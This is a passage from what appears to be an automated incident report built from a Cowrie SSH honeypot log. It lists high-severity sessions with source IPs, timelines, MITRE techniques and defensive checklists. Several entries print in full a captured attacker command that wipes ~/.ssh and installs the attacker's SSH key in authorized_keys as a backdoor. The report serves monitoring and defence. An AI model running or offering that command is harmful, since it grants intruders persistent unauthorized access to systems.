**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:03:59` | `cowrie.session.connect` |
| `2026-06-08 13:03:59` | `cowrie.client.version` |
| `2026-06-08 13:04:00` | `cowrie.client.kex` |
| `2026-06-08 13:04:01` | `cowrie.login.success` |
| `2026-06-08 13:04:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.188.112[.]111` to AbuseIPDB if not already reported
- [ ] Block `35.188.112[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce64dd0b60a9

| Field | Detail |
|---|---|
| **Source IP** | `34.123.134[.]194` |
| **First Seen** | 2026-06-08 13:04 |
| **Last Seen** | 2026-06-08 13:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:04:30` | `cowrie.session.connect` |
| `2026-06-08 13:04:30` | `cowrie.client.version` |
| `2026-06-08 13:04:30` | `cowrie.client.kex` |
| `2026-06-08 13:04:31` | `cowrie.login.success` |
| `2026-06-08 13:04:31` | `cowrie.session.params` |
| `2026-06-08 13:04:31` | `cowrie.command.input` |
| `2026-06-08 13:04:31` | `cowrie.command.failed` |
| `2026-06-08 13:04:32` | `cowrie.log.closed` |
| `2026-06-08 13:04:32` | `cowrie.session.params` |
| `2026-06-08 13:04:32` | `cowrie.command.input` |
| `2026-06-08 13:04:32` | `cowrie.session.file_download` |
| `2026-06-08 13:04:32` | `cowrie.log.closed` |
| `2026-06-08 13:04:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.123.134[.]194` to AbuseIPDB if not already reported
- [ ] Block `34.123.134[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3f2408dd823

| Field | Detail |
|---|---|
| **Source IP** | `34.123.134[.]194` |
| **First Seen** | 2026-06-08 13:04 |
| **Last Seen** | 2026-06-08 13:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:04:35` | `cowrie.session.connect` |
| `2026-06-08 13:04:35` | `cowrie.client.version` |
| `2026-06-08 13:04:35` | `cowrie.client.kex` |
| `2026-06-08 13:04:36` | `cowrie.login.success` |
| `2026-06-08 13:04:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.123.134[.]194` to AbuseIPDB if not already reported
- [ ] Block `34.123.134[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94ea789d26ab

| Field | Detail |
|---|---|
| **Source IP** | `179.176.210[.]17` |
| **First Seen** | 2026-06-08 13:09 |
| **Last Seen** | 2026-06-08 13:10 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:09:56` | `cowrie.session.connect` |
| `2026-06-08 13:09:56` | `cowrie.client.version` |
| `2026-06-08 13:09:57` | `cowrie.client.kex` |
| `2026-06-08 13:09:58` | `cowrie.login.success` |
| `2026-06-08 13:09:59` | `cowrie.session.params` |
| `2026-06-08 13:09:59` | `cowrie.command.input` |
| `2026-06-08 13:09:59` | `cowrie.command.failed` |
| `2026-06-08 13:09:59` | `cowrie.log.closed` |
| `2026-06-08 13:10:00` | `cowrie.session.params` |
| `2026-06-08 13:10:00` | `cowrie.command.input` |
| `2026-06-08 13:10:00` | `cowrie.session.file_download` |
| `2026-06-08 13:10:00` | `cowrie.log.closed` |
| `2026-06-08 13:10:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.176.210[.]17` to AbuseIPDB if not already reported
- [ ] Block `179.176.210[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7653e9cef366

| Field | Detail |
|---|---|
| **Source IP** | `179.176.210[.]17` |
| **First Seen** | 2026-06-08 13:10 |
| **Last Seen** | 2026-06-08 13:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:10:04` | `cowrie.session.connect` |
| `2026-06-08 13:10:04` | `cowrie.client.version` |
| `2026-06-08 13:10:04` | `cowrie.client.kex` |
| `2026-06-08 13:10:05` | `cowrie.login.success` |
| `2026-06-08 13:10:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.176.210[.]17` to AbuseIPDB if not already reported
- [ ] Block `179.176.210[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e296e102c05d

| Field | Detail |
|---|---|
| **Source IP** | `35.188.112[.]111` |
| **First Seen** | 2026-06-08 13:10 |
| **Last Seen** | 2026-06-08 13:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:10:37` | `cowrie.session.connect` |
| `2026-06-08 13:10:37` | `cowrie.client.version` |
| `2026-06-08 13:10:37` | `cowrie.client.kex` |
| `2026-06-08 13:10:38` | `cowrie.login.success` |
| `2026-06-08 13:10:39` | `cowrie.session.params` |
| `2026-06-08 13:10:39` | `cowrie.command.input` |
| `2026-06-08 13:10:39` | `cowrie.command.failed` |
| `2026-06-08 13:10:39` | `cowrie.log.closed` |
| `2026-06-08 13:10:40` | `cowrie.session.params` |
| `2026-06-08 13:10:40` | `cowrie.command.input` |
| `2026-06-08 13:10:40` | `cowrie.session.file_download` |
| `2026-06-08 13:10:40` | `cowrie.log.closed` |
| `2026-06-08 13:10:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.188.112[.]111` to AbuseIPDB if not already reported
- [ ] Block `35.188.112[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a09f3f0811b9

| Field | Detail |
|---|---|
| **Source IP** | `35.188.112[.]111` |
| **First Seen** | 2026-06-08 13:10 |
| **Last Seen** | 2026-06-08 13:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:10:43` | `cowrie.session.connect` |
| `2026-06-08 13:10:43` | `cowrie.client.version` |
| `2026-06-08 13:10:43` | `cowrie.client.kex` |
| `2026-06-08 13:10:44` | `cowrie.login.success` |
| `2026-06-08 13:10:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.188.112[.]111` to AbuseIPDB if not already reported
- [ ] Block `35.188.112[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-361dab7f4c73

| Field | Detail |
|---|---|
| **Source IP** | `161.248.189[.]72` |
| **First Seen** | 2026-06-08 13:11 |
| **Last Seen** | 2026-06-08 13:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:11:41` | `cowrie.session.connect` |
| `2026-06-08 13:11:41` | `cowrie.client.version` |
| `2026-06-08 13:11:41` | `cowrie.client.kex` |
| `2026-06-08 13:11:42` | `cowrie.login.success` |
| `2026-06-08 13:11:42` | `cowrie.session.params` |
| `2026-06-08 13:11:42` | `cowrie.command.input` |
| `2026-06-08 13:11:42` | `cowrie.command.failed` |
| `2026-06-08 13:11:42` | `cowrie.log.closed` |
| `2026-06-08 13:11:42` | `cowrie.session.params` |
| `2026-06-08 13:11:42` | `cowrie.command.input` |
| `2026-06-08 13:11:42` | `cowrie.session.file_download` |
| `2026-06-08 13:11:42` | `cowrie.log.closed` |
| `2026-06-08 13:11:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.248.189[.]72` to AbuseIPDB if not already reported
- [ ] Block `161.248.189[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4576796a19a

| Field | Detail |
|---|---|
| **Source IP** | `161.248.189[.]72` |
| **First Seen** | 2026-06-08 13:11 |
| **Last Seen** | 2026-06-08 13:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:11:43` | `cowrie.session.connect` |
| `2026-06-08 13:11:43` | `cowrie.client.version` |
| `2026-06-08 13:11:43` | `cowrie.client.kex` |
| `2026-06-08 13:11:44` | `cowrie.login.success` |
| `2026-06-08 13:11:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.248.189[.]72` to AbuseIPDB if not already reported
- [ ] Block `161.248.189[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b998c78bc116

| Field | Detail |
|---|---|
| **Source IP** | `35.188.112[.]111` |
| **First Seen** | 2026-06-08 13:12 |
| **Last Seen** | 2026-06-08 13:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:12:18` | `cowrie.session.connect` |
| `2026-06-08 13:12:18` | `cowrie.client.version` |
| `2026-06-08 13:12:18` | `cowrie.client.kex` |
| `2026-06-08 13:12:19` | `cowrie.login.success` |
| `2026-06-08 13:12:19` | `cowrie.session.params` |
| `2026-06-08 13:12:19` | `cowrie.command.input` |
| `2026-06-08 13:12:19` | `cowrie.command.failed` |
| `2026-06-08 13:12:20` | `cowrie.log.closed` |
| `2026-06-08 13:12:20` | `cowrie.session.params` |
| `2026-06-08 13:12:20` | `cowrie.command.input` |
| `2026-06-08 13:12:20` | `cowrie.session.file_download` |
| `2026-06-08 13:12:20` | `cowrie.log.closed` |
| `2026-06-08 13:12:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.188.112[.]111` to AbuseIPDB if not already reported
- [ ] Block `35.188.112[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-124858045a0b

| Field | Detail |
|---|---|
| **Source IP** | `35.188.112[.]111` |
| **First Seen** | 2026-06-08 13:12 |
| **Last Seen** | 2026-06-08 13:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:12:23` | `cowrie.session.connect` |
| `2026-06-08 13:12:23` | `cowrie.client.version` |
| `2026-06-08 13:12:24` | `cowrie.client.kex` |
| `2026-06-08 13:12:25` | `cowrie.login.success` |
| `2026-06-08 13:12:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.188.112[.]111` to AbuseIPDB if not already reported
- [ ] Block `35.188.112[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c66b10564f31

| Field | Detail |
|---|---|
| **Source IP** | `68.183.212[.]68` |
| **First Seen** | 2026-06-08 13:13 |
| **Last Seen** | 2026-06-08 13:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:13:00` | `cowrie.session.connect` |
| `2026-06-08 13:13:00` | `cowrie.client.version` |
| `2026-06-08 13:13:00` | `cowrie.client.kex` |
| `2026-06-08 13:13:01` | `cowrie.login.success` |
| `2026-06-08 13:13:01` | `cowrie.session.params` |
| `2026-06-08 13:13:01` | `cowrie.command.input` |
| `2026-06-08 13:13:01` | `cowrie.command.failed` |
| `2026-06-08 13:13:02` | `cowrie.log.closed` |
| `2026-06-08 13:13:02` | `cowrie.session.params` |
| `2026-06-08 13:13:02` | `cowrie.command.input` |
| `2026-06-08 13:13:02` | `cowrie.session.file_download` |
| `2026-06-08 13:13:02` | `cowrie.log.closed` |
| `2026-06-08 13:13:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.212[.]68` to AbuseIPDB if not already reported
- [ ] Block `68.183.212[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d8e49209050

| Field | Detail |
|---|---|
| **Source IP** | `68.183.212[.]68` |
| **First Seen** | 2026-06-08 13:13 |
| **Last Seen** | 2026-06-08 13:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:13:04` | `cowrie.session.connect` |
| `2026-06-08 13:13:04` | `cowrie.client.version` |
| `2026-06-08 13:13:04` | `cowrie.client.kex` |
| `2026-06-08 13:13:05` | `cowrie.login.success` |
| `2026-06-08 13:13:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.212[.]68` to AbuseIPDB if not already reported
- [ ] Block `68.183.212[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e3bbb3b5562

| Field | Detail |
|---|---|
| **Source IP** | `42.51.32[.]228` |
| **First Seen** | 2026-06-08 13:13 |
| **Last Seen** | 2026-06-08 13:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:13:56` | `cowrie.session.connect` |
| `2026-06-08 13:13:56` | `cowrie.client.version` |
| `2026-06-08 13:13:56` | `cowrie.client.kex` |
| `2026-06-08 13:13:57` | `cowrie.login.success` |
| `2026-06-08 13:13:57` | `cowrie.session.params` |
| `2026-06-08 13:13:57` | `cowrie.command.input` |
| `2026-06-08 13:13:57` | `cowrie.command.failed` |
| `2026-06-08 13:13:57` | `cowrie.log.closed` |
| `2026-06-08 13:13:57` | `cowrie.session.params` |
| `2026-06-08 13:13:57` | `cowrie.command.input` |
| `2026-06-08 13:13:58` | `cowrie.session.file_download` |
| `2026-06-08 13:13:58` | `cowrie.log.closed` |
| `2026-06-08 13:14:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.51.32[.]228` to AbuseIPDB if not already reported
- [ ] Block `42.51.32[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6589c6e8d808

| Field | Detail |
|---|---|
| **Source IP** | `42.51.32[.]228` |
| **First Seen** | 2026-06-08 13:14 |
| **Last Seen** | 2026-06-08 13:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:14:00` | `cowrie.session.connect` |
| `2026-06-08 13:14:00` | `cowrie.client.version` |
| `2026-06-08 13:14:00` | `cowrie.client.kex` |
| `2026-06-08 13:14:00` | `cowrie.login.success` |
| `2026-06-08 13:14:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.51.32[.]228` to AbuseIPDB if not already reported
- [ ] Block `42.51.32[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-964104a8b095

| Field | Detail |
|---|---|
| **Source IP** | `34.123.134[.]194` |
| **First Seen** | 2026-06-08 13:14 |
| **Last Seen** | 2026-06-08 13:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:14:19` | `cowrie.session.connect` |
| `2026-06-08 13:14:19` | `cowrie.client.version` |
| `2026-06-08 13:14:19` | `cowrie.client.kex` |
| `2026-06-08 13:14:20` | `cowrie.login.success` |
| `2026-06-08 13:14:21` | `cowrie.session.params` |
| `2026-06-08 13:14:21` | `cowrie.command.input` |
| `2026-06-08 13:14:21` | `cowrie.command.failed` |
| `2026-06-08 13:14:22` | `cowrie.log.closed` |
| `2026-06-08 13:14:22` | `cowrie.session.params` |
| `2026-06-08 13:14:22` | `cowrie.command.input` |
| `2026-06-08 13:14:22` | `cowrie.session.file_download` |
| `2026-06-08 13:14:22` | `cowrie.log.closed` |
| `2026-06-08 13:14:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.123.134[.]194` to AbuseIPDB if not already reported
- [ ] Block `34.123.134[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-736f92268156

| Field | Detail |
|---|---|
| **Source IP** | `34.123.134[.]194` |
| **First Seen** | 2026-06-08 13:14 |
| **Last Seen** | 2026-06-08 13:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:14:25` | `cowrie.session.connect` |
| `2026-06-08 13:14:25` | `cowrie.client.version` |
| `2026-06-08 13:14:25` | `cowrie.client.kex` |
| `2026-06-08 13:14:26` | `cowrie.login.success` |
| `2026-06-08 13:14:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.123.134[.]194` to AbuseIPDB if not already reported
- [ ] Block `34.123.134[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3878a7496b43

| Field | Detail |
|---|---|
| **Source IP** | `35.188.112[.]111` |
| **First Seen** | 2026-06-08 13:15 |
| **Last Seen** | 2026-06-08 13:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
